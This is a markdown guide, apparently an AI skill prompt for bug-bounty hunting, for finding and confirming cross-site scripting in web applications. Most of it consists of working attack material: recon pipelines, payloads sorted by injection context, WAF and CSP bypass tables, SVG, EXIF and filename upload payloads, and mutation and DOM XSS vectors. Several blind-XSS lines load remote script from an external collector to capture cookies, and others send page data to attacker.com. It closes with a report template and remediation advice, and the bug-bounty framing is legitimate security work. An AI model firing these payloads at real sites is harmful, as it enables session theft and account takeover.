# XSS-ELITE: Zero-False-Positive Cross-Site Scripting Hunter

Trained on 100+ real HackerOne XSS reports, 50+ research papers, and years of live bug bounty hunting. Covers reflected, stored, DOM, blind, mutation, universal XSS across all frameworks and contexts.

---

## 🔥 3 Easy Ways to Find XSS (Start Here)

### 1️⃣ Fuzz Every URL
```
echo target.com | waybackurls | katana -jc | nuclei -dast -t ~/nuclei-templates/http/exposures/dast/xss/
```
**Pipeline**: Gather all URLs → fuzz every param with Nuclei DAST XSS templates → triage results.

**Full workflow:**
```
subfinder -d target.com -silent | httpx -silent > live.txt
cat live.txt | waybackurls > wayback.txt
cat live.txt | gau >> wayback.txt
katana -list live.txt -jc -kf all -o katana.txt
cat wayback.txt katana.txt | sort -u | grep '?' > fuzz-targets.txt
nuclei -l fuzz-targets.txt -dast -t ~/nuclei-templates/http/exposures/dast/xss/ -o xss-hits.txt
```

### 2️⃣ Upload XSS (Cover Images, Attachments, Signatures)
Less-explored upload endpoints are goldmines. Try:
- **SVG upload**: Upload `.svg` with embedded `<script>alert(1)</script>`
- **Extension bypass**: `.svg.png`, `.svg.php`, `.svg;.jpg` — some servers check the _last_ extension but execute the _first_ content type
- **Content-Type switch**: Upload `.svg` as `Content-Type: image/png` or `image/jpeg`
- **EXIF injection**: Use `exiftool` to inject XSS into image metadata (Artist, Description, Comment fields)
- **PDF upload**: Create PDF with JavaScript OpenAction
- **XML/SHTML**: Some upload parsers render XML with embedded HTML

### 3️⃣ Payload as Filename
If the app saves and displays the filename, inject the payload directly into the filename:
```
<script>alert(document.domain)</script>.png
";alert(document.domain);//
<img src=x onerror=alert(document.domain)>.jpg
<svg onload=alert(1)>.gif
```
When the filename renders as-is in the page → **Stored XSS**.

---

## Core Philosophy: Zero False Positives

Every finding must pass ALL 3 gates before reporting:

| Gate | Check | Method |
|------|-------|--------|
| **G1: Execution** | Payload executes in a clean browser (no extensions, vanilla Chrome/Firefox) | `alert()`, `console.log()`, or `document.title` mutation |
| **G2: Exfiltration** | Data leaves the origin | Interactsh/xss.report callback received (HTTP/DNS) |
| **G3: Reproduction** | Can be reproduced from scratch with a 3-step minimum PoC | Clear steps, no assumed state |

**Kill the finding if any gate fails.** No "likely vulnerable," no "probably XSS," no "might be."

---

## 12-Stage Kill Chain

```
RECON → PARAM_DISCOVERY → CONTEXT_DETECTION → PAYLOAD_SELECT → INJECT → 
OBSERVE → CONFIRM → BYPASS → ESCALATE → DOCUMENT → VERIFY → REPORT
```

### Stage 1: Surface Recon
```
echo target.com | subfinder -silent | httpx -silent | tee live.txt
waybackurls target.com | grep -aE '(\?|\&)(q|s|search|query|term|page|id|url|redirect|return|next|file|load|read|view|path|name|msg|text|title|message|error|callback|jsonp|debug|token|data|input)=' | tee params.txt
katana -list live.txt -jc -kf all -o all-urls.txt
gau target.com | grep '?' >> params.txt
```

### Stage 2: Parameter Discovery
- Extract unique params: `cat params.txt | grep -oP '[\?&]\K[^=]+' | sort -u > unique_params.txt`
- Fuzz missing params: use param-miner, arjun, x8
- Test HTTP headers: `User-Agent, Referer, X-Forwarded-For, X-Forwarded-Host, CF-Connecting-IP`
- Test POST body params, JSON keys, GraphQL arguments, multipart fields

### Stage 3: Context Detection (CRITICAL - determines payload choice)

Inject a harmless probe string and observe where it lands:

| Probe | Look For | Context |
|-------|----------|---------|
| `PROBE123` | Raw text | HTML body / text node |
| `"PROBE123` | `"PROBE123` in source | Double-quoted attribute |
| `'PROBE123` | `'PROBE123` in source | Single-quoted attribute |
| `<PROBE123>` | `<PROBE123>` rendered/escaped | HTML tag context |
| `{PROBE123}` | Templating engine eval | Angular/Vue/React |
| `{{7*7}}` | `49` in response | Server-side template (SSTI) |

### Stage 4: Context-Specific Payload Injection

#### Context A: HTML Body (between tags)
```
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<select autofocus onfocus=alert(document.domain)>
<textarea autofocus onfocus=alert(document.domain)>
<video><source onerror=alert(document.domain)>
<audio><source onerror=alert(document.domain)>
```

#### Context B: HTML Attribute (inside quotes)
```
" onfocus=alert(document.domain) autofocus="
' onfocus=alert(document.domain) autofocus='
` onfocus=alert(document.domain) autofocus=`
" autofocus onfocus=alert(document.domain) x="
" onmouseover=alert(document.domain) "
" onfocusin=alert(document.domain) autofocus "
" onfocus=alert(document.domain) autofocus tabindex=1 "
" onfocus=alert(document.domain) autofocus x="
```

#### Context C: Attribute with no quotes
```
?param=x onfocus=alert(1) autofocus tabindex=1
```

#### Context D: Inside `<script>` tag
```
</script><script>alert(document.domain)</script>
</script><img src=x onerror=alert(document.domain)>
';alert(document.domain)//
\';alert(document.domain)//
</script><svg onload=alert(document.domain)>
```

#### Context E: Inside JavaScript string
```
'-alert(document.domain)-'
\"-alert(document.domain)-\"
${alert(document.domain)}
\\'-alert(document.domain)-'
\\${alert(document.domain)}
```

#### Context F: Inside event handler attribute
```
javascript:alert(document.domain)
alert(document.domain)
confirm(document.domain)
prompt(document.domain)
```

#### Context G: Inside `href`/`src`/`action`/`formaction`
```
javascript:alert(document.domain)
javascript:alert(document.cookie)
data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
```

#### Context H: Inside CSS `<style>` or `style` attribute
```
</style><script>alert(document.domain)</script>
<style>@import url(http://attacker.com/steal)</style>
<div style="background:url(http://attacker.com/steal)">
expression(alert(document.domain))
```

#### Context I: Template injection (Angular/Vue/React)
```
{{constructor.constructor('alert(document.domain)')()}}
{{
$on.constructor('alert(document.domain)')()
}}
${7*7}
<%= 7*7 %>
{{7*7}}
```

#### Context J: Markdown/rich text
```
[click](javascript:alert(document.domain))
<img src=x onerror=alert(document.domain)>
<video><source onerror=alert(document.domain)>
<iframe onload=alert(document.domain)>
```

#### Context K: JSON response with wrong Content-Type
```
{"key": "<script>alert(document.domain)</script>"}
{"key": "<img src=x onerror=alert(document.domain)>"}
```

#### Context L: Upload-based (filenames, metadata, content)
```
File named: <script>alert(document.domain)</script>.png
File named: "; alert(document.domain) //
SVG content with embedded script
```

---

## WAF Bypass Engine (50+ Techniques)

### Encoding Layer
| # | Technique | Example |
|---|-----------|---------|
| 1 | Mixed case | `<ScRiPt>alert(1)</ScRiPt>` |
| 2 | Hex escape | `<img src=x onerror=\x61lert(1)>` |
| 3 | Octal escape | `<svg onload=\141lert(1)>` |
| 4 | Unicode escape | `<\u0073cript>alert(1)</script>` |
| 5 | HTML entities | `&#97;&#108;&#101;&#114;&#116;(1)` |
| 6 | Double URL encode | `%253Cscript%253Ealert(1)%253C%252Fscript%253E` |
| 7 | Triple URL encode | `%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E` |
| 8 | UTF-16 encode | `%u00FF%u00FF...` |
| 9 | UTF-7 encode | `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` |
| 10 | Base64 via data URI | `<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>` |

### Injection Layer
| # | Technique | Example |
|---|-----------|---------|
| 11 | Comment injection | `<sc<!-->ript>alert(1)</sc<!-->ript>` |
| 12 | Tab injection | `<scr\tipt>alert(1)</script>` |
| 13 | Newline injection | `<scr%0aipt>alert(1)</script>` |
| 14 | Null byte | `<scri%00pt>alert(1)</script>` |
| 15 | CRLF injection | `<scr%0d%0aipt>alert(1)</script>` |
| 16 | Space mutation | `< script >alert(1)</ script >` |
| 17 | Tab in attributes | `<img src=x	onerror=alert(1)>` |
| 18 | Nested tags | `<script<script>>alert(1)</script>` |
| 19 | Broken tag | `<x<script>alert(1)</script>` |
| 20 | Unclosed tag | `<script>alert(1)` |

### Bypass Layer
| # | Technique | Example |
|---|-----------|---------|
| 21 | HPP (param pollution) | `?p=1&p=<script>&r=alert(1)&s=</script>` |
| 22 | Array param | `?param[]=<script>alert(1)</script>` |
| 23 | Content-Type switch | `Content-Type: text/plain` then HTML in body |
| 24 | Charset bypass | `Content-Type: text/html; charset=utf-7` |
| 25 | Case permutation | `<sCrIpT>alert(1)</sCrIpT>` |
| 26 | WAF buffer overflow | Send 8000+ bytes padding + payload |
| 27 | Parameter fragmentation | Split payload across params |
| 28 | JSONP callback | `?callback=<script>alert(1)</script>` |
| 29 | Dangling markup | `<img src="https://attacker.com/steal?data=` |
| 30 | Base tag injection | `<base href=https://attacker.com/>` |
| 31 | Form action hijack | `<form action=javascript:alert(1)><button>click` |
| 32 | Meta refresh | `<meta http-equiv=refresh content=0;url=javascript:alert(1)>` |

### Advanced Bypass
| # | Technique | Example |
|---|-----------|---------|
| 33 | CSS expression (IE) | `<div style="x:expression(alert(1))">` |
| 34 | CDATA bypass (XML) | `<![CDATA[><script>alert(1)</script>]]>` |
| 35 | !-- comment bypass | `<!--><script>alert(1)</script>` |
| 36 | `%00` before tags | `%00<script>alert(1)</script>` |
| 37 | `\x00` before tags | `\x00<script>alert(1)</script>` |
| 38 | Vertical tab | `<scr\x0Bipt>alert(1)</script>` |
| 39 | Form feed | `<scr\x0Cipt>alert(1)</script>` |
| 40 | Unicode fullwidth | `<ｓcript>alert(1)</script>` |
| 41 | `<svg>` with `<script>` | `<svg><script>alert(1)</script></svg>` |
| 42 | `<math>` with href | `<math><mi xlink:href=javascript:alert(1)>click` |

---

## CSP Bypass Matrix

| CSP Directive | Bypass Technique |
|---------------|------------------|
| `default-src 'self'` | JSONP endpoint on same origin, uploaded JS file |
| `script-src 'self'` | Find angular/closure/require.js on the page for RCE |
| `script-src 'self' 'unsafe-inline'` | Standard XSS works |
| `script-src 'self' 'unsafe-eval'` | `eval(location.hash.slice(1))` |
| `script-src 'nonce-abc'` | Check nonce reuse, predictable nonce, DOM clobber nonce |
| `script-src 'sha256-xxx'` | Hash is for user-controllable script? Inject matching hash |
| `script-src *.cdn.com` | Find a可控 script on that CDN |
| `base-uri missing` | `<base href=https://attacker.com>` hijacks relative scripts |
| `object-src 'none'` missing | `<object data=javascript:alert(1)>` |
| `form-action 'self'` | `<form action=https://attacker.com>` data exfiltration |
| No CSP at all | Full XSS |
| `report-uri /report` | Open redirect in report-uri to inject CSP |

### CSP Bypass Quick Checklist
1. `curl -sI https://target.com | grep -i content-security-policy`
2. Parse directives
3. If `unsafe-inline` → standard XSS works, report immediately
4. If `'self'` only → scan for JSONP endpoints, file upload, angular apps
5. If nonce → try reusing, check if it changes
6. If hash → check if controllable content matches the hash
7. If missing `base-uri` → `<base>` hijack
8. If `report-uri` has open redirect → CSP bypass via redirect

---

## Blind XSS: Full Setup & Hunting

### Setup (5 min)
```bash
# Option A: interactsh (self-hosted or cloud)
interactsh-client -v  # Get your callback URL

# Option B: xss.report (managed)
# Sign up, get collector ID

# Option C: Burp Collaborator (if licensed)
```

### Injection Points (highest impact first)
| Target | Where to Inject | Impact |
|--------|----------------|--------|
| Admin panels (User-Agent, Referer) | HTTP headers | Full admin account takeover |
| Contact/feedback forms | Message field, name, email | Stored XSS in admin view |
| Log viewers | X-Forwarded-For, User-Agent | XSS in security/log dashboard |
| PDF generators | Name, title fields | XSS in generated PDF (JS execution) |
| Email previews | Subject, sender name | XSS in email client |
| Error monitoring (Sentry, etc.) | Error message, URL | XSS in error dashboard |
| Support ticketing | Ticket description | Agent XSS |
| DNS/web analytics | Referer, URL path | XSS in analytics dashboard |

### Blind XSS Payloads (xss.report)
```
"><script src=https://xss.report/c/yukthi93></script>
<script src=https://xss.report/c/yukthi93></script>
'><script src=https://xss.report/c/yukthi93></script>
</script><script src=https://xss.report/c/yukthi93></script>
<img src=x onerror="var s=document.createElement('script');s.src='https://xss.report/c/yukthi93';document.body.appendChild(s)">
<svg onload="var s=document.createElement('script');s.src='https://xss.report/c/yukthi93';document.body.appendChild(s)">
<link rel=stylesheet href=https://xss.report/c/yukthi93>
```

### Blind XSS Verification Checklist
- [ ] Interactsh callback received (HTTP or DNS)
- [ ] Cookie value present in callback
- [ ] Can reproduce from clean state
- [ ] Confirmed which input field triggered it

---

## Framework-Specific XSS

### Angular (v1/v2+)

**Angular 1.x sandbox escape:**
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{a='constructor';b='alert(1)';constructor[a](b)()}}
{{toString.constructor.prototype.toString.constructor('alert(1)')()}}
```

**Angular 2+ (if `DomSanitizer` bypassed):**
```
<img src [src]="'x' | safeUrl" onerror="alert(1)">
<div [innerHTML]="'<img src=x onerror=alert(1)>'"></div>
```

### React (if `dangerouslySetInnerHTML` or refs used)
```
<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} />
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)" />
```

### Vue (if `v-html` used)
```
<div v-html="'<img src=x onerror=alert(1)>'"></div>
<a :href="'javascript:alert(1)'">click</a>
```

### jQuery (if user input in sinks)
```
$('#target').html('<img src=x onerror=alert(1)>')
$('<img/src/onerror=alert(1)>')
$('.class').append('<img src=x onerror=alert(1)>')
```

### HTMX
```
<div hx-get="/user/profile" hx-trigger="load" _="on load alert(1)"></div>
```

---

## Upload-Based XSS

### SVG Upload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>alert(document.domain)</script>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <use href="data:image/svg+xml,&lt;script&gt;alert(1)&lt;/script&gt;">
</svg>
```

### SVG with event handler
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

### Filename-based
```
Name your file: <script>alert(document.domain)</script>.svg
Name: ";alert(document.domain);//
Name: <img src=x onerror=alert(document.domain)>.png
```

### EXIF Metadata
Use exiftool to inject XSS into image metadata:
```bash
exiftool -Artist='<script>alert(document.domain)</script>' image.jpg
exiftool -ImageDescription='<img src=x onerror=alert(document.domain)>' image.jpg
exiftool -XMP-dc-Description='<svg onload=alert(document.domain)>' image.jpg
```

### PDF Upload
Create PDF with embedded JavaScript:
- Use `pdftex` with `\pdfcatalog{/AA <</O /OpenAction /JS (app.alert('XSS'))>>}`
- Or edit PDF with `qpdf` / `pdfkit` to add `/AA` or `/OpenAction`

---

## DOM XSS: Deep Dive

### Source → Sink Mapping

| Source | Sink | Risk |
|--------|------|------|
| `location.hash` | `innerHTML` | Critical |
| `location.search` | `document.write` | Critical |
| `location.pathname` | `eval` | Critical |
| `document.referrer` | `setTimeout(string)` | Critical |
| `window.name` | `new Function()` | Critical |
| `postMessage` origin | `innerHTML` | Critical |
| `localStorage` | `insertAdjacentHTML` | High |
| `sessionStorage` | `outerHTML` | High |
| `cookies` | `jQuery.html()` | High |
| `URL params` | `React dangerouslySetInnerHTML` | High |
| `XHR/Fetch response` | `Vue v-html` | High |

### Detection Techniques
```
# Static analysis
grep -rn "innerHTML\|outerHTML\|document.write\|\.html(\|eval("\|setTimeout(" src/

# Dynamic analysis (Burp DOM Invader + Headless Chrome)
# Use puppeteer/playwright to crawl with taint tracking
```

### PostMessage XSS
Check for:
```javascript
window.addEventListener('message', function(e) {
    // Check if origin is validated
    // Check if data is sanitized before DOM insert
    document.getElementById('content').innerHTML = e.data;  // VULN
});
```
PoC:
```html
<iframe src="https://target.com/vuln" id="victim"></iframe>
<script>
document.getElementById('victim').contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
</script>
```

### DOM Clobbering
```html
<a id=defaultAvatar><a id=defaultAvatar name=href href="x:alert(document.domain)">
```
Useful when code references `window.something.someProperty` and you can create DOM elements with matching IDs.

---

## Mutation XSS (mXSS)

Targets innerHTML mutation where the parser sanitizes one way but the browser interprets differently.

### Template element mXSS
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### Select element mXSS  
```
<select><style></select><img src=x onerror=alert(1)></style>
```

### Style element mXSS
```
<style><img src=x onerror=alert(1)></style>
```

### Namespace mXSS
```
<svg><p><style><img src=x onerror=alert(1)></style></p></svg>
```

---

## Zero-False-Positive Verification Protocol

### Step 1: Test in Browser
```bash
# Use a clean Chrome profile (no extensions)
google-chrome --incognito --disable-extensions

# Inject payload
# Check for:
#   - alert() dialog appears
#   - console.log() output visible
#   - document.title changed
#   - Network tab shows callback to your server
```

### Step 2: Confirm with Headless Browser
```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

opts = Options()
opts.add_argument('--headless')
opts.add_argument('--disable-extensions')
driver = webdriver.Chrome(options=opts)

# Inject payload, check for execution
driver.get('https://target.com/vuln?param=<script>alert(1)</script>')
try:
    alert = driver.switch_to.alert
    print(f"[+] XSS CONFIRMED: alert text = {alert.text}")
    alert.accept()
except:
    print("[-] No alert detected")
```

### Step 3: Verify Exfiltration
If you're using a callback payload:
```bash
# Start interactsh
interactsh-client -v

# Inject blind XSS payload with your callback URL
# Wait for incoming request
# Confirm cookie/data in the callback
```

### Step 4: Eliminate False Positives
Kill the finding if:
- [ ] Alert only triggers with certain extensions installed → FALSE POSITIVE
- [ ] Payload reflected but not executed (HTML encoded) → NOT XSS
- [ ] Only `javascript:` prompt in href but requires click → LOW/INFO
- [ ] Only triggers in browser dev console → NOT XSS
- [ ] Requires authentication AND the reflected data comes from current user → SELF-XSS (usually out of scope)
- [ ] Only works with `data:` URI and target uses CSP → BLOCKED

---

## Reporting Template

```
**Title:** [Type] XSS in [endpoint] via [parameter/input]

**Summary:**
A [Reflected/Stored/DOM/Blind] Cross-Site Scripting vulnerability exists in
[URL] via the [parameter] parameter. An attacker can inject arbitrary
JavaScript that executes in the context of the victim's session.

**Steps to Reproduce:**

1. Navigate to:
   https://target.com/vuln?param=PROBE

2. Observe that PROBE is reflected in [context] without sanitization.

3. Inject the following payload:
   https://target.com/vuln?param=<img src=x onerror=alert(document.domain)>

4. Observe that an alert box fires with the domain name.

**PoC:**
[Base64-encoded or URL to PoC, or screenshot/video]

**Impact:**
An attacker can:
- Steal session cookies for account takeover
- Perform actions on behalf of the victim
- Deface the page
- Escalate to further attacks (credential theft, keylogging, etc.)

**Remediation:**
- Sanitize all user input using context-aware escaping
- Apply Content-Security-Policy headers
- Use DOMPurify or similar library for rich text
- Validate and encode output based on context

**Severity:** [Critical/High/Medium/Low]

**Affected:**
- Endpoint: https://target.com/vuln
- Parameter: param
- Payload: <img src=x onerror=alert(document.domain)>
```
